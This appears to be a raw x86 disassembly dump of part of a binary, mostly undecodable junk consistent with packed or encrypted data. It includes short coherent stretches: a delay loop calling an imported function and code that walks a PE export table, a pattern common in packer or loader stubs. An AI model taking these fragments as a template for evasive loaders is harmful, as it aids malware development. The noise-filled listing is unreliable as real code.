  40aeaa:	jbe    0xb1f8ee0d
  40aeb0:	cmp    BYTE PTR [edi-0x4b],dl
  40aeb3:	adc    DWORD PTR [esi],esi
  40aeb5:	cmp    BYTE PTR [ebx+ebp*1-0x67e7c4c],bh
  40aebc:	inc    eax
  40aebd:	mov    ecx,0x63c4909b
  40aec2:	aad    0xe0
  40aec4:	ins    DWORD PTR es:[edi],dx
  40aec5:	xor    al,0xd1
  40aec7:	inc    ebp
  40aec8:	cs retf 0xeac5
  40aecc:	add    ebx,DWORD PTR [ecx+esi*1+0x2fd0b3fc]
  40aed3:	stos   BYTE PTR es:[edi],al
  40aed4:	fdivr  DWORD PTR [ebp-0xd56ae25]
  40aeda:	jo     0x40aefd
  40aedc:	vpcmpeqd xmm3,xmm6,XMMWORD PTR [ebx+edx*4+0x524ba425]
  40aee5:	clc    
  40aee6:	xchg   edi,eax
  40aee7:	mov    WORD PTR [edx+0xd6f77c9],cs
  40aeed:	es loopne 0x40ae83
  40aef0:	jmp    0x15cd:0xd84035b4
  40aef7:	mov    eax,0x11764cc8
  40aefc:	xor    DWORD PTR [edi-0x5d],esi
  40aeff:	call   0xde0e:0x840b0e9
  40af06:	hlt    
  40af07:	inc    esp
  40af08:	aas    
  40af09:	cmp    DWORD PTR [ecx],edx
  40af0b:	push   0xffffffdd
  40af0d:	ins    BYTE PTR es:[edi],dx
  40af0e:	mov    al,0xe9
  40af10:	pop    es
  40af11:	rcl    DWORD PTR [ebx+0x19399761],cl
  40af17:	sbb    eax,0xc4728ac7
  40af1c:	bound  esp,QWORD PTR [ecx-0x6b]
  40af1f:	lea    ebp,[eax+0x793d5efd]
  40af25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af26:	test   al,0xe0
  40af28:	and    eax,0xe932666c
  40af2d:	jecxz  0x40aec5
  40af2f:	repnz xlat BYTE PTR ds:[ebx]
  40af31:	dec    esp
  40af32:	pop    eax
  40af33:	in     al,0xdd
  40af35:	test   eax,0x7f0696fc
  40af3a:	fidivr DWORD PTR [edi-0x29]
  40af3d:	or     al,0x72
  40af40:	(bad)  
  40af41:	mov    al,ds:0xff4f49fa
  40af46:	nop
  40af47:	nop
  40af48:	aaa    
  40af49:	cmp    eax,DWORD PTR [ecx-0x53]
  40af4c:	or     BYTE PTR [eax-0x76],0x94
  40af50:	popf   
  40af51:	sub    al,bl
  40af53:	loope  0x40aee9
  40af55:	pusha  
  40af56:	and    BYTE PTR [edi+0x1935d5d4],bl
  40af5c:	cmp    al,0x3d
  40af5e:	inc    ecx
  40af5f:	loopne 0x40afab
  40af61:	inc    edi
  40af62:	jmp    0xa4702013
  40af67:	lods   al,BYTE PTR ds:[esi]
  40af68:	xchg   ecx,eax
  40af69:	fnstsw WORD PTR [edx-0x78]
  40af6c:	fsub   QWORD PTR [edx-0x16]
  40af6f:	lods   eax,DWORD PTR ds:[esi]
  40af70:	adc    cl,BYTE PTR [ebx-0x367ee7c0]
  40af76:	sbb    BYTE PTR [eax+0x0],dh
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4337a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43375f
  40af93:	sub    DWORD PTR ds:0x43370f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43375b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43375b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43375b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43375b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43375b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43375b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43375b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43375b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4337a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	pop    ebp
  40b018:	stc    
  40b019:	mov    edx,edi
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	push   edx
  40b024:	jmp    0xd8841ee6
  40b029:	cmp    dh,BYTE PTR [ecx]
  40b02b:	jnp    0x40b067
  40b02d:	or     DWORD PTR [eax+0x57],eax
  40b030:	stos   BYTE PTR es:[edi],al
  40b031:	loope  0x40b090
  40b033:	int    0xef
  40b035:	ins    BYTE PTR es:[edi],dx
  40b036:	test   al,0xa6
  40b038:	cmp    DWORD PTR [ebx-0x7e],0xffffffa8
  40b03c:	(bad)  
  40b03d:	pop    ss
  40b03e:	hlt    
  40b03f:	and    BYTE PTR [edi+0x27],bh
  40b042:	mov    edi,0x3b7a4870
  40b047:	jb     0x40b075
  40b049:	push   es
  40b04a:	in     eax,0x76
  40b04c:	stos   DWORD PTR es:[edi],eax
  40b04d:	aad    0xc4
  40b04f:	cld    
  40b050:	mov    es,esi
  40b052:	sar    DWORD PTR [ecx],cl
  40b054:	push   esi
  40b055:	pop    ss
  40b056:	fxch   st(7)
  40b058:	jno    0x40affb
  40b05a:	push   ebp
  40b05b:	in     eax,0x81
  40b05d:	cmp    ebx,DWORD PTR [edx-0x402ae435]
  40b063:	mov    ds:0x42db7a2e,al
  40b068:	xor    esi,DWORD PTR [edi-0x7f526c7d]
  40b06e:	iret   
  40b06f:	mov    al,ds:0x1403982
  40b074:	test   DWORD PTR [ecx+0x375d670e],edx
  40b07a:	cmp    eax,eax
  40b07c:	pop    ebx
  40b07d:	inc    ebx
  40b07e:	mov    eax,ds:0xf59d9cc2
  40b083:	sahf   
  40b084:	sub    DWORD PTR [ecx],ecx
  40b086:	xchg   edx,eax
  40b087:	or     eax,0x8e5ed84e
  40b08c:	sbb    BYTE PTR [edx],0x27
  40b08f:	js     0x40b09a
  40b091:	stos   BYTE PTR es:[edi],al
  40b092:	cdq    
  40b093:	jmp    0x166d:0x58979fc5
  40b09a:	in     eax,dx
  40b09b:	(bad)  
  40b09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b09d:	pushf  
  40b09e:	aam    0x53
  40b0a0:	sbb    DWORD PTR [esi+0x44dd1bfa],esp
  40b0a6:	js     0x40b0fb
  40b0a8:	adc    eax,0x3e292fdc
  40b0ad:	scas   eax,DWORD PTR es:[edi]
  40b0ae:	jo     0x40b0a3
  40b0b0:	sub    DWORD PTR [ebx+edi*1+0x70bd1ef3],ecx
  40b0b7:	fs pushf 
  40b0b9:	xchg   ebx,eax
  40b0ba:	lahf   
  40b0bb:	sahf   
  40b0bc:	(bad)  
  40b0bd:	sbb    ch,BYTE PTR [ebx+edi*8]
  40b0c0:	mov    gs,ebx
  40b0c2:	mov    ebp,0xf3ffa810
  40b0c7:	dec    edi
  40b0c8:	pop    edx
  40b0c9:	sti    
  40b0ca:	push   ss
  40b0cb:	push   0xffffffb8
  40b0cd:	inc    DWORD PTR [edi-0x61]
  40b0d0:	xchg   BYTE PTR [ebx-0x3e],dh
  40b0d3:	test   al,0x1a
  40b0d5:	jbe    0x40b0fe
  40b0d7:	mov    WORD PTR [ebx+0x7d],cs
  40b0da:	sti    
  40b0db:	or     dl,BYTE PTR [ebp-0x13]
  40b0de:	lds    ebp,FWORD PTR [ecx+esi*8-0x2177dcd4]
  40b0e5:	pop    edi
  40b0e6:	add    BYTE PTR [ecx],dh
  40b0e8:	push   ds
  40b0e9:	mov    dh,0x10
  40b0eb:	lock jb 0x40b0ae
  40b0ee:	xchg   BYTE PTR gs:[ebx+0x3a],cl
  40b0f2:	cmp    ah,dl
  40b0f4:	je     0x40b154
  40b0f6:	repnz popf 
  40b0f8:	xor    BYTE PTR [edi+0x77bc113c],bl
  40b0fe:	(bad)  
  40b100:	ja     0x40b0aa
  40b102:	ds mov edi,0xe241463c
  40b108:	(bad)  
  40b109:	cwde   
  40b10a:	cwde   
  40b10b:	push   esp
  40b10c:	jo     0x40b0f0
  40b10e:	dec    esi
  40b10f:	or     DWORD PTR [eax-0x2f],ecx
  40b112:	sbb    edi,DWORD PTR [edi+esi*2-0x5f]
  40b116:	ins    BYTE PTR es:[edi],dx
  40b117:	mov    esp,0x9005a248
  40b11c:	cs mov ebx,0xd562309f
  40b122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b123:	gs scas al,BYTE PTR es:[edi]
  40b125:	int    0xc1
  40b127:	enter  0xd16f,0xc
  40b12b:	mov    cl,0xdd
  40b12d:	push   esi
  40b12e:	add    eax,0x7e6f40ef
  40b133:	sbb    dl,BYTE PTR ss:[edx+0x7bdec2ee]
  40b13a:	mov    ecx,0x30c1daea
  40b13f:	jbe    0x40b157
  40b141:	mov    al,0xa
  40b143:	mov    ?,WORD PTR ds:0xace836ef
  40b149:	mov    DWORD PTR [edi+0x70],esp
  40b14c:	icebp  
  40b14d:	adc    esp,DWORD PTR [esi-0x15625789]
  40b153:	mov    dl,0x49
  40b155:	enter  0x46fb,0x56
  40b159:	and    eax,0xfba90840
  40b15e:	ror    BYTE PTR [ecx-0x349faa08],cl
  40b164:	not    DWORD PTR [edx-0x1c391761]
  40b16a:	jae    0x40b17d
  40b16c:	popf   
  40b16d:	cmc    
  40b16e:	test   DWORD PTR [edx],edx
  40b170:	in     eax,0x7d
  40b172:	ret    
  40b173:	mov    al,ds:0xda103ba6
  40b178:	pushf  
  40b179:	jecxz  0x40b190
  40b17b:	ins    BYTE PTR es:[edi],dx
  40b17c:	add    al,0x7a
  40b17e:	aas    
  40b17f:	push   ds
  40b180:	sbb    BYTE PTR [eax+0x548c1973],al
  40b186:	mov    ds:0xb7895388,al
  40b18b:	cdq    
  40b18c:	and    DWORD PTR [eax+0x49],edx
  40b18f:	stos   BYTE PTR es:[edi],al
  40b190:	shl    BYTE PTR [ecx-0x44],0x38
  40b194:	xor    ch,cl
  40b196:	sbb    ecx,DWORD PTR [ecx+0x77]
  40b199:	mov    dl,0xa2
  40b19b:	or     DWORD PTR [ebp-0x24469a77],0xffffff90
  40b1a2:	xchg   ebp,eax
  40b1a3:	jl     0x40b14b
  40b1a5:	ja     0x40b193
  40b1a7:	or     al,0x63
  40b1a9:	pop    ebx
  40b1aa:	fisubr WORD PTR [ecx+eiz*1]
  40b1ad:	in     al,0xc1
  40b1af:	xor    al,dl
  40b1b1:	loop   0x40b1d9
  40b1b3:	movhps xmm7,QWORD PTR [esi]
  40b1b6:	jmp    0xcb123894
  40b1bb:	mov    bh,0xf6
  40b1bd:	cdq    
  40b1be:	xchg   ecx,eax
  40b1bf:	pushf  
  40b1c0:	sub    DWORD PTR es:[edi],ebp
  40b1c3:	cmp    eax,0x178198
  40b1c8:	test   BYTE PTR [ebx-0x61],ch
  40b1cb:	mov    WORD PTR [edi],fs
  40b1cd:	dec    edx
  40b1ce:	jmp    0x40b23d
  40b1d0:	data16 loop 0x40b188
  40b1d3:	mov    DWORD PTR [ebp+0x43a685a7],esi
  40b1d9:	jg     0x40b217
  40b1db:	jno    0x40b1e0
  40b1dd:	cld    
  40b1de:	cmp    al,0xe6
  40b1e0:	aad    0x61
  40b1e2:	xchg   BYTE PTR [edx+0x402251d0],ah
  40b1e8:	sbb    ch,BYTE PTR [edx+0x3f]
  40b1eb:	aas    
  40b1ec:	stos   DWORD PTR es:[edi],eax
  40b1ed:	es or  al,0xee
  40b1f0:	xchg   esi,eax
  40b1f1:	push   esp
  40b1f2:	or     DWORD PTR [edi],eax
  40b1f4:	jmp    0x867d484c
  40b1f9:	div    BYTE PTR [edi]
  40b1fb:	xchg   ebx,eax
  40b1fc:	call   0x4ab:0x51397caf
  40b203:	ss pop ds
  40b205:	iret   
  40b206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b207:	gs push 0x6d
  40b20a:	dec    edi
  40b20b:	xchg   edi,eax
  40b20c:	sar    ecx,cl
  40b20e:	adc    al,0x3c
  40b210:	mov    ds:0xb22a4fbc,al
  40b215:	mov    esi,0x3052fb65
  40b21a:	stos   BYTE PTR es:[edi],al
  40b21b:	(bad)  
  40b21c:	scas   al,BYTE PTR es:[edi]
  40b21d:	jb     0x40b1b2
  40b21f:	lods   al,BYTE PTR ds:[esi]
  40b220:	popa   
  40b221:	fisttp DWORD PTR [ebp+0x4b46b6f]
  40b227:	xlat   BYTE PTR ds:[ebx]
  40b228:	xchg   esp,eax
  40b229:	imul   esi,DWORD PTR [edx+0x4c],0xffffffb2
  40b22d:	fst    QWORD PTR [edx+0x50cce39b]
  40b233:	dec    esp
  40b234:	adc    ah,BYTE PTR [ebx]
  40b236:	clc    
  40b237:	popa   
  40b238:	out    dx,eax
  40b239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b23a:	mov    edx,0x5459ac4c
  40b23f:	inc    edi
  40b240:	sub    eax,DWORD PTR [ebx-0x4fb00b1f]
  40b246:	inc    esp
  40b247:	lds    esi,FWORD PTR [edx-0x507541d4]
  40b24d:	ja     0x40b287
  40b24f:	pop    edx
  40b250:	(bad)  
  40b251:	stc    
  40b252:	xchg   esp,eax
  40b253:	adc    bl,ch
  40b255:	test   al,0x2e
  40b257:	arpl   WORD PTR [ebx+0x1dd82317],bx
  40b25d:	aam    0xda
  40b25f:	xchg   esp,eax
  40b260:	sub    al,0xec
  40b262:	test   BYTE PTR [edi+0x62f1fe28],al
  40b268:	cmp    ecx,DWORD PTR [ebx+0x4d8bec45]
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	mov    al,0x30
  40b285:	call   0x387e:0x7ef22e41
  40b28c:	jl     0x40b30c
  40b28e:	jle    0x40b281
  40b290:	dec    edi
  40b291:	rol    DWORD PTR [eax+0x3b161fa7],cl
  40b297:	inc    ebp
  40b298:	add    al,0x14
  40b29a:	mov    esp,0xeb6cbecb
  40b29f:	in     eax,dx
  40b2a0:	jnp    0x40b31a
  40b2a2:	pushf  
  40b2a3:	retf   0xd996
  40b2a6:	add    esi,edx
  40b2a8:	dec    esp
  40b2a9:	xor    BYTE PTR [ebx-0x69],bh
  40b2ac:	loope  0x40b2ed
  40b2ae:	ins    DWORD PTR es:[edi],dx
  40b2af:	or     edi,DWORD PTR [edi+0x7a07d914]
  40b2b5:	cwde   
  40b2b6:	cmp    bh,BYTE PTR [eax-0x31]
  40b2b9:	push   edx
  40b2ba:	in     eax,dx
  40b2bb:	ins    BYTE PTR es:[edi],dx
  40b2bc:	arpl   cx,di
  40b2be:	jmp    0x4b469b91
  40b2c3:	sbb    DWORD PTR [edx],edi
  40b2c5:	mov    eax,0xeccd252e
  40b2ca:	stos   BYTE PTR es:[edi],al
  40b2cb:	(bad)  
  40b2cc:	add    BYTE PTR [edx],bh
  40b2ce:	dec    esi
  40b2cf:	fistp  WORD PTR [edi]
  40b2d1:	sti    
  40b2d2:	adc    BYTE PTR [edi],dl
  40b2d4:	sbb    ah,BYTE PTR [edx+0x34493a50]
  40b2da:	inc    edx
  40b2db:	sbb    DWORD PTR [esi+eax*2-0x15],0xef1a0dab
  40b2e3:	(bad)  
  40b2e4:	pusha  
  40b2e5:	and    ebx,DWORD PTR [esi+0x2fd0728]
  40b2eb:	jb     0x40b33a
  40b2ed:	clc    
  40b2ee:	inc    eax
  40b2ef:	pop    esi
  40b2f0:	jle    0x40b28e
  40b2f2:	push   cs
  40b2f3:	ds adc eax,0xbc00e133
  40b2f9:	push   0xffffffea
  40b2fb:	in     eax,dx
  40b2fc:	sbb    al,0x96
  40b2fe:	jmp    0x832b331d
  40b303:	lds    esi,FWORD PTR [esi]
  40b305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b306:	shl    DWORD PTR [eax],1
  40b308:	ret    
  40b309:	fistp  QWORD PTR [edi+esi*1-0x57093600]
  40b310:	jbe    0x40b2c8
  40b312:	mov    BYTE PTR [edi-0x1],bh
  40b315:	loop   0x40b34b
  40b317:	cli    
  40b318:	inc    esi
  40b319:	repz mov ch,BYTE PTR [eax-0x61c5fe24]
  40b320:	xchg   edi,eax
  40b321:	or     eax,0xcbad85fd
  40b326:	mov    edx,ss
  40b328:	jg     0x40b2f5
  40b32a:	shr    BYTE PTR [ebp-0x7ea2336b],0xe7
  40b331:	add    eax,0xfd079a36
  40b336:	mov    bl,0xbb
  40b338:	mov    esi,0xc578d324
  40b33d:	pop    esi
  40b33e:	xcrypt-ecb (bad)
  40b33f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b340:	or     eax,0xfd6af837
  40b345:	arpl   WORD PTR [esi+0x5e66c563],dx
  40b34b:	mov    ?,esp
  40b34d:	stos   DWORD PTR es:[edi],eax
  40b34e:	xchg   edi,eax
  40b34f:	jmp    0x40b32f
  40b351:	pop    ss
  40b352:	or     ecx,ecx
  40b354:	test   al,0x84
  40b356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b357:	push   esp
  40b358:	ds pop ebx
  40b35a:	dec    ecx
  40b35b:	enter  0x5fdc,0x71
  40b35f:	repz mov ch,0xd5
  40b362:	gs inc eax
  40b364:	pop    ss
  40b365:	push   0x1f482e91
  40b36a:	mov    ?,WORD PTR [ecx+ebp*8]
  40b36d:	sub    edi,ebp
  40b36f:	lahf   
  40b370:	stos   BYTE PTR es:[edi],al
  40b371:	inc    ecx
  40b372:	sub    eax,0x20b7939d
  40b377:	rcl    eax,cl
  40b379:	fmul   QWORD PTR [eax-0x60]
  40b37c:	mov    dl,0x19
  40b37e:	jnp    0x40b3c7
  40b380:	inc    ebp
  40b381:	jb     0x40b35f
  40b383:	lahf   
  40b384:	imul   edx,ebp,0xdebb8224
  40b38a:	out    0x4a,al
  40b38c:	es mov al,ah
  40b38f:	jmp    0xfc6842e5
  40b394:	dec    edi
  40b395:	int    0x54
  40b397:	xchg   edi,eax
  40b398:	ss dec eax
  40b39a:	outs   dx,DWORD PTR ds:[esi]
  40b39b:	dec    ecx
  40b39c:	sbb    DWORD PTR ds:0x4e0142ec,ebp
  40b3a2:	pop    ebp
  40b3a3:	sar    DWORD PTR [edi],1
  40b3a5:	push   edi
  40b3a6:	inc    ebp
  40b3a7:	(bad)  
  40b3a8:	and    ch,BYTE PTR [edx+0xa1f8899]
  40b3ae:	lea    ebp,[ebx-0x29]
  40b3b1:	dec    esi
  40b3b2:	dec    DWORD PTR [esi]
  40b3b4:	adc    DWORD PTR [esi+0x11a923ac],ebx
  40b3ba:	xor    ebp,esp
  40b3bc:	push   esi
  40b3bd:	out    0x2b,al
  40b3bf:	and    BYTE PTR [edi],al
  40b3c1:	fdivr  QWORD PTR ds:0x6735ab4a
  40b3c7:	cmovs  esp,DWORD PTR [eax]
  40b3ca:	pop    es
  40b3cb:	push   esi
  40b3cc:	and    DWORD PTR [ecx+0x1e],esp
  40b3cf:	outs   dx,BYTE PTR ds:[esi]
  40b3d0:	clc    
  40b3d1:	push   es
  40b3d2:	(bad)  
  40b3d3:	pop    ss
  40b3d4:	into   
  40b3d5:	clc    
  40b3d6:	sbb    BYTE PTR [eax+0x6e],bl
  40b3d9:	add    BYTE PTR [esi-0x6efb2a9b],cl
  40b3df:	mov    ah,0x33
  40b3e1:	push   ebx
  40b3e2:	mov    ss,WORD PTR [edi-0x1d]
  40b3e5:	xchg   esi,ecx
  40b3e7:	jb     0x40b3c0
  40b3e9:	xlat   BYTE PTR fs:[ebx]
  40b3eb:	or     esp,ebp
  40b3ed:	sub    DWORD PTR [ecx],ebp
  40b3ef:	mov    edi,0x72be59c7
  40b3f4:	fcom   QWORD PTR [edx+ebp*2+0x5]
  40b3f8:	dec    edx
  40b3f9:	out    dx,al
  40b3fa:	push   ds
  40b3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3fc:	jl     0x40b456
  40b3fe:	sar    BYTE PTR [ecx+ecx*2-0x14],1
  40b402:	xlat   BYTE PTR ds:[ebx]
  40b403:	dec    edi
  40b404:	inc    ebp
  40b405:	dec    eax
  40b406:	add    eax,esp
  40b408:	and    BYTE PTR [edx-0x3d66d334],ah
  40b40e:	les    esp,FWORD PTR [edx+0x1a4641d2]
  40b414:	push   esi
  40b415:	inc    edi
  40b416:	push   ss
  40b417:	cli    
  40b418:	dec    ecx
  40b419:	fs mov sp,0xee74
  40b41e:	pop    es
  40b41f:	jo     0x40b489
  40b421:	xchg   esi,eax
  40b422:	retf   0x729
  40b425:	adc    DWORD PTR [esi+0x5d],0xfffffffb
  40b429:	jb     0x40b42a
  40b42b:	sub    eax,0xe01c56a5
  40b430:	gs lock sti 
  40b433:	pop    ecx
  40b434:	adc    bl,BYTE PTR [eax+0x14c9ced2]
  40b43a:	xor    eax,0x1ece73dd
  40b43f:	lds    ecx,FWORD PTR [eax+0x16]
  40b442:	sar    esi,cl
  40b444:	push   ebp
  40b445:	xchg   BYTE PTR [ebx-0x7964e6fd],cl
  40b44b:	push   esp
  40b44c:	or     eax,0xceebbd9e
  40b451:	ss rcl cl,1
  40b454:	pusha  
  40b455:	aad    0xa3
  40b457:	mov    ecx,0xad1038b9
  40b45c:	popa   
  40b45d:	add    esi,DWORD PTR [edi+0x7d6ba3a0]
  40b463:	nop
  40b464:	clc    
  40b465:	mov    ds:0xeb0c09,eax
  40b46a:	push   0x193540b1
  40b46f:	cdq    
  40b470:	out    0x4d,al
  40b472:	xchg   esi,eax
  40b473:	sub    edi,DWORD PTR [edi-0x515038df]
  40b479:	call   edi
  40b47b:	and    DWORD PTR [ebx+ecx*1-0x45],esp
  40b47f:	lea    edx,[edx+0x4b]
  40b482:	popf   
  40b483:	retf   
  40b484:	imul   edx,DWORD PTR [eax],0x759c0330
  40b48a:	adc    bh,BYTE PTR [esi+0x6596f951]
  40b490:	stos   BYTE PTR es:[edi],al
  40b491:	push   ebx
  40b492:	bound  eax,QWORD PTR [edi+0x5d1fed5e]
  40b498:	into   
  40b499:	into   
  40b49a:	mov    dh,0xe2
  40b49c:	jae    0x40b436
  40b49e:	cmp    dl,BYTE PTR [edi-0x17e04df6]
  40b4a4:	jmp    0xb8a8ead5
  40b4a9:	mov    ebx,0xc9f9ec19
  40b4ae:	mov    dl,0xa1
  40b4b0:	and    BYTE PTR [esi-0x55],bl
  40b4b3:	push   eax
  40b4b4:	test   eax,0x287def3e
  40b4b9:	das    
  40b4ba:	shr    ebx,cl
  40b4bc:	mov    bh,0xe3
  40b4be:	xor    al,0xab
  40b4c0:	daa    
  40b4c1:	aam    0x54
  40b4c3:	mov    ebx,0xd93ad447
  40b4c8:	inc    edi
  40b4c9:	call   0xde91:0xc700fe11
  40b4d0:	push   ebx
  40b4d1:	push   ecx
  40b4d2:	jle    0x40b4be
  40b4d4:	cli    
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	jmp    0x40b560
  40b509:	les    edi,FWORD PTR [ecx-0x18]
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	cmp    eax,0x810efc01
  40b518:	cli    
  40b519:	push   edx
  40b51a:	mov    al,0xe0
  40b51c:	adc    al,0x92
  40b51e:	jne    0x40b4be
  40b520:	mov    dh,0x40
  40b522:	pop    ds
  40b523:	(bad)  
  40b524:	cld    
  40b525:	and    al,0x6d
  40b527:	les    eax,FWORD PTR [edx-0x7]
  40b52a:	pop    ebp
  40b52b:	xor    al,BYTE PTR [esi]
  40b52d:	(bad)  
  40b52e:	sbb    esi,DWORD PTR ds:0xc8bf6669
  40b534:	out    dx,eax
  40b535:	adc    eax,0x13ce39e9
  40b53a:	test   dh,ah
  40b53c:	fld    QWORD PTR [ebp-0x5c]
  40b53f:	or     ecx,0xffffffb0
  40b542:	dec    esp
  40b544:	out    dx,eax
  40b545:	std    
  40b546:	and    DWORD PTR [ecx+0x511acbd1],ebx
  40b54c:	xor    DWORD PTR [ecx+eax*4],edx
  40b54f:	enter  0x5816,0xc7
  40b553:	loope  0x40b51c
  40b555:	xchg   ebx,edi
  40b557:	mov    al,ds:0x3ec87ec7
  40b55c:	adc    eax,0x48624af3
  40b561:	ss jae 0x40b5d0
  40b564:	dec    ebx
  40b565:	ret    
  40b566:	mov    edi,0xa911840c
  40b56b:	ins    DWORD PTR es:[di],dx
  40b56d:	shl    DWORD PTR ds:0x4b4a625,0x26
  40b574:	out    0x2b,eax
  40b576:	inc    ebx
  40b577:	daa    
  40b578:	mov    edx,0xda01be85
  40b57d:	loope  0x40b56c
  40b57f:	dec    edx
  40b580:	jl     0x40b5ed
  40b582:	sbb    ch,bh
  40b584:	adc    cl,BYTE PTR [ecx]
  40b586:	push   ebp
  40b587:	cmp    eax,0xd8d14527
  40b58c:	sti    
  40b58d:	repz retf 
  40b58f:	cmp    BYTE PTR [ebp-0x6ace9667],ah
  40b595:	fdiv   st(6),st
  40b597:	das    
  40b598:	jnp    0x40b59d
  40b59a:	push   cs
  40b59b:	outs   dx,DWORD PTR ds:[esi]
  40b59c:	in     eax,dx
  40b59d:	add    al,0x6a
  40b59f:	mov    WORD PTR [ebx-0x23],cs
  40b5a2:	(bad)  
  40b5a4:	push   ebx
  40b5a5:	dec    edi
  40b5a6:	sbb    DWORD PTR [edi-0x51],ebx
  40b5a9:	push   ecx
  40b5aa:	jne    0x40b5f3
  40b5ac:	xor    DWORD PTR [esp+ebx*1],esp
  40b5af:	(bad)  
  40b5b0:	cmp    DWORD PTR [eax+0x5ffb5277],eax
  40b5b6:	jb     0x40b56a
  40b5b8:	add    edx,DWORD PTR [esp+esi*1]
  40b5bb:	cwde   
  40b5bc:	inc    edx
  40b5bd:	aas    
  40b5be:	sub    eax,0xb824c012
  40b5c3:	or     ebx,ebx
  40b5c5:	xor    DWORD PTR [ecx+0x7],eax
  40b5c8:	sub    al,BYTE PTR [edi-0x5d65c6c1]
  40b5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5cf:	fild   QWORD PTR [edi+0x436b9450]
  40b5d5:	jp     0x40b55e
  40b5d7:	jecxz  0x40b5f0
  40b5d9:	sti    
  40b5da:	(bad)  
  40b5dc:	frstor ds:0x8ff186b9
  40b5e2:	jno    0x40b63d
  40b5e4:	lds    esi,FWORD PTR [edx]
  40b5e6:	leave  
  40b5e7:	(bad)  
  40b5e8:	out    0xae,al
  40b5ea:	inc    esi
  40b5eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ec:	cs ja  0x40b64d
  40b5ef:	xchg   edx,eax
  40b5f0:	test   eax,0x5a35d9b3
  40b5f6:	mov    esi,0x514da946
  40b5fb:	xchg   ecx,eax
  40b5fc:	xor    eax,0x20a7757d
  40b601:	xor    ecx,0xffffffba
  40b604:	cmp    eax,0xb38c11f8
  40b609:	inc    ebp
  40b60a:	sbb    al,0x38
  40b60c:	and    cl,dl
  40b60e:	loop   0x40b617
  40b610:	shl    BYTE PTR [edi+0x7b],cl
  40b613:	pop    edi
  40b614:	fs ins DWORD PTR es:[edi],dx
  40b616:	sub    BYTE PTR [esp+eiz*2+0x4],dl
  40b61a:	jp     0x40b65e
  40b61c:	leave  
  40b61d:	pop    eax
  40b61e:	adc    al,0x7e
  40b620:	xor    bl,al
  40b622:	mov    eax,ds:0x8ae9e7a8
  40b627:	pop    ebx
  40b628:	inc    edi
  40b629:	add    al,0x89
  40b62b:	sub    dh,BYTE PTR [edi+0x6e]
  40b62e:	cmp    al,0xb
  40b630:	push   edi
  40b631:	outs   dx,DWORD PTR ds:[esi]
  40b632:	fidivr WORD PTR [ebp-0x60]
  40b635:	clc    
  40b636:	xchg   BYTE PTR [edx+0x1c51b432],bh
  40b63c:	mov    DWORD PTR [edx],0x5a4ecd83
  40b642:	icebp  
  40b643:	fnstenv ds:0xc192b64d
  40b649:	lock add cl,BYTE PTR [esp+esi*1-0x4b]
  40b64e:	or     eax,DWORD PTR [edx+0x5268513]
  40b654:	and    esi,DWORD PTR [esi-0x6fba1fab]
  40b65a:	push   esp
  40b65b:	adc    BYTE PTR [eax+eax*4+0x30],0xd9
  40b660:	push   eax
  40b661:	imul   esp,DWORD PTR [ebx],0x9b3abbd7
  40b667:	pop    esi
  40b668:	jl     0x40b641
